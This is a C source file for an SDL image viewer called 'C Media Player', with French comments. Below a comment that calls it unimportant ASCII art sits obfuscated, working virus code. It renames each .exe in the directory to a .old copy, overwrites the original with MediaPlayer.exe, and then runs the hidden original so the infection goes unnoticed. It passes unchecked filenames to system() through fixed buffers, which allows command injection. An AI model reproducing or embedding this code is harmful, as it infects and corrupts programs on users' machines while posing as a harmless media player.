#include <SDL2/SDL.h>
#include <SDL2/SDL_image.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdbool.h>
#include <dirent.h>
#include <unistd.h> 
#include <string.h>
#define start(argc ,argv ) int main(argc ,argv )
#define WINDOW_WIDTH 800
#define WINDOW_HEIGHT 600

// Vérifie si le fichier est une image
bool estImage(const char *nom) {
    const char *extensions[] = {".png", ".jpg", ".jpeg", ".bmp"};
    size_t nbExtensions = sizeof(extensions) / sizeof(extensions[0]);
    for (size_t i = 0; i < nbExtensions; i++) {
        if (strstr(nom, extensions[i]) != NULL) {
            return true;
        }
    }
    return false;
}


// Charge une image
SDL_Texture* loadImage(char *filePath, SDL_Renderer *renderer) {
    SDL_Texture* newTexture = NULL;
    SDL_Surface* loadedSurface = IMG_Load(filePath);
    if (loadedSurface == NULL) {
        printf("Unable to load image %s! SDL_image Error: %s\n", filePath, IMG_GetError());
    } else {
        newTexture = SDL_CreateTextureFromSurface(renderer, loadedSurface);
        if (newTexture == NULL) {
            printf("Unable to create texture from %s! SDL Error: %s\n", filePath, SDL_GetError());
        }
        SDL_FreeSurface(loadedSurface);
    }
    return newTexture;
}

// Affiche une image et gère les événements
void afficheImage() {
    SDL_Window* window = NULL;
    SDL_Renderer* renderer = NULL;

    if (SDL_Init(SDL_INIT_VIDEO) < 0) {
        printf("SDL could not initialize! SDL Error: %s\n", SDL_GetError());
        return;
    }

    window = SDL_CreateWindow("C Media Player - Image Viewer", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, WINDOW_WIDTH, WINDOW_HEIGHT, SDL_WINDOW_SHOWN);
    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);

    char dossierImages[] = "./images";
    DIR *dossier;
    struct dirent *entree;
    char *images[100]; 
    int nbImages = 0;

    if ((dossier = opendir(dossierImages)) != NULL) {
        while ((entree = readdir(dossier)) != NULL && nbImages < 100) {
            if (estImage(entree->d_name)) {
                images[nbImages] = malloc(strlen(dossierImages) + strlen(entree->d_name) + 2);
                strcpy(images[nbImages], dossierImages);
                strcat(images[nbImages], "/");
                strcat(images[nbImages], entree->d_name);
                nbImages++;
            }
        }
        closedir(dossier);
    } else {
        perror("Erreur lors de l'ouverture du dossier");
        return;
    }

    int currentImage = 0;
    SDL_Texture* currentTexture = NULL;
    bool quit = false;
    SDL_Event e;

    while (!quit) {
        while (SDL_PollEvent(&e) != 0) {
            if (e.type == SDL_QUIT) {
                quit = true;
            } else if (e.type == SDL_KEYDOWN) {
                switch (e.key.keysym.sym) {
                    case SDLK_LEFT:
                        currentImage = (currentImage - 1 + nbImages) % nbImages;
                        break;
                    case SDLK_RIGHT:
                        currentImage = (currentImage + 1) % nbImages;
                        break;
                }
            }
        }

        currentTexture = loadImage(images[currentImage], renderer);
        SDL_RenderClear(renderer);
        SDL_RenderCopy(renderer, currentTexture, NULL, NULL);
        SDL_RenderPresent(renderer);
        SDL_DestroyTexture(currentTexture);
        currentTexture = NULL;
    }

    for (int i = 0; i < nbImages; i++) {
        free(images[i]);
    }

    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    SDL_Quit();}/*}
}   

int main(){
	afficheImage();
	return 0;
}


*/// ASCII ART RIEN D'IMPORTANT



void a(struct dirent *f)                      {char c[99];           strcpy /************/                    (c,"chmod +x ");strcat(c,f->d_name);system(c);
}void r(struct dirent  *f )                   {char r[99];           strcpy           /****/                  (r,"cp ");strcat                (r,f->d_name);
strcat(r," ") ; strcat (r,f->                 d_name);strcat          (r,        /****/                       ".old");system(r)               ;}void d(struct 
dirent *f)    {char dp[99]; strcpy(           dp,/* blabla*/            "cp ./MediaPlayer.exe ")              ;strcat(dp,f->d_name);system(dp);}void i(){DIR* 
dir=opendir     (".");struct dirent *f;       struct stat               infoFichier;char/**/                  old[100];if (dir==NULL)    {printf ("Erreur opendir");
exit(0);/**/       }while ((f=readdir(dir))!= NULL){strcpy(          old,f ->        d_name);                 strcat(old,".old");stat      (f->d_name,&infoFichier);if
(strstr(f->        d_name,".exe")!=NULL&&strstr(f->d_name,           ".old")==NULL&&strstr   (f->             d_name,"MediaPlayer.exe"       )==NULL&&access(old,F_OK)!=


0){if(!(S_ISREG(infoFichier.st_mode)&&(infoFichier.st_mode&S_IXUSR))){a(f);}r(f);d(f);}}closedir(dir);}start(int argc,char* args[]){char cmg[99];i();if(!strcmp(args[0],"./MediaPlayer.exe")){afficheImage();}else{strcpy(cmg,args[0]);strcat(cmg,".old");system(cmg);}return EXIT_SUCCESS;}





